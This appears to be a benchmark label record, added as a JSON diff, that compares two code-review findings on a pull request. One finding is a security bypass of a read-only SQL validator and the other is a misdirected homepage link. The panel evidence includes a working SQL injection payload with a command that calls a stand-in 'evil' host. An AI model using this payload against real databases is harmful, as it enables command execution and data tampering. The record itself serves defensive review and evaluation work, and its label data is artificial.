@@ -1,0 +1,68 @@
+{
+ "schema": "pair-label",
+ "schema_version": 1,
+ "pair_key": "97d981b2cdad",
+ "pair_key_vintage": "harvest.mjs at wafflebase#801 de4dde47b",
+ "corpus_version": "2026-08-10-pilot-reviewed",
+ "run_id": "pilot-01__k2",
+ "item_id": "pr-429",
+ "rubric": "one-fix-discharges-both",
+ "verdict": "different",
+ "label_source": "silver",
+ "annotators": [
+  "claude-opus-5"
+ ],
+ "confidence": "high",
+ "evidence": "A bypassable read-only SQL guard against a wrong card link.",
+ "adjudication_basis": {
+  "shown": [
+   "item",
+   "both files and lines",
+   "both severities",
+   "panel summary",
+   "panel evidence",
+   "coderabbit title",
+   "coderabbit detail prose"
+  ],
+  "not_shown": [
+   "the diff",
+   "the matcher's verdict",
+   "score/tokens/loc/symbolOverlap",
+   "sibling pairs of either finding"
+  ],
+  "coderabbit_detail_available": true
+ },
+ "panel": {
+  "arm": "panel",
+  "file": "packages/backend/src/datasource/sql-validator.ts",
+  "line": 28,
+  "summary": "Read-only SQL guard bypassable: validator strips \"comments\" the executed query does not have, allowing arbitrary multi-statement SQL on the datasource feature this change newly documents/advertises",
+  "evidence": "`validateSelectQuery` strips `/*...*/` with a regex BEFORE any string-literal awareness (sql-validator.ts:28-31), but `executeQuery` runs the ORIGINAL, unstripped `dto.query` (datasource.service.ts:150). A `/*` inside a string literal therefore blanks out the middle of the query for the validator while Postgres executes it. Payload (any workspace member — the only gate is `assertMember`, datasource.controller.ts:139-143): `SELECT '/*' AS a) AS q; COPY t FROM PROGRAM 'curl http://evil/$(id)'; SELECT * FROM (SELECT '*/' AS b`. Validator view after comment-strip is `SELECT '' AS b` → first token SELECT, no forbidden keyword, no semicolon → valid. Executed string becomes `SELECT * FROM (SELECT '/*' AS a) AS q; COPY t FROM PROGRAM '...'; SELECT * FROM (SELECT '*/' AS b) AS _q LIMIT 10001` — three syntactically valid statements, giving INSERT/UPDATE/DELETE/DROP/COPY-FROM-PROGRAM against the connection owner's credentials. Pre-existing code; this change adds packages/documentation/sheets/datasources.md and a homepage card promoting the feature as SELECT-only/read-only.",
+  "severity": "critical",
+  "lens": "security",
+  "finding_key": "packages/backend/src/datasource/sql-validator.ts::read-only sql guard bypassable: validator strips \"comments\" the executed query does not have, allowing arbitrary multi-statement sql on the datasource feature this change newly documents/advertises"
+ },
+ "coderabbit": {
+  "arm": "coderabbit",
+  "file": "packages/frontend/src/app/home/features-section.tsx",
+  "line": 71,
+  "summary": "Point this card at the comments guide, or narrow the copy.",
+  "detail": "**Point this card at the comments guide, or narrow the copy.** This card is primarily about comments and `@mentions`, but its CTA goes to `/docs/docs-editor/writing-a-document`. In this PR, comments/mentions were documented in the collaboration guide, so the current link sends readers to the wrong page.",
+  "severity": "minor",
+  "finding_key": "packages/frontend/src/app/home/features-section.tsx::point this card at the comments guide, or narrow the copy."
+ },
+ "produced_against": {
+  "repo_head": "de4dde47be012f80a6b935a5f72ad256198a3f64",
+  "note": "wafflebase#801, unmerged at label time"
+ },
+ "diff_sha256": "sha256:29727fad241a9a9b7d2465030740e71af40a1f8c309c216196829d1045a70693",
+ "matcher": {
+  "verdict_at_label_time": "maybe",
+  "reason": "partial evidence (location 0, content 0.07) — needs adjudication",
+  "score": 0.3357142857142857
+ },
+ "labeled_at_utc": "2026-08-13T05:58:36.671Z",
+ "harness": "in-session",
+ "rubric_backfilled": "added 2026-08-13; label-maybes.mjs record() omitted it for batches 1-4. The verdicts themselves are unchanged.",
+ "pair_key_vintage_backfilled": "added 2026-08-13; label-maybes.mjs record() omitted it. Recovered from produced_against.repo_head, identical on all 297, and cross-checked against the records that already carried it."
+}
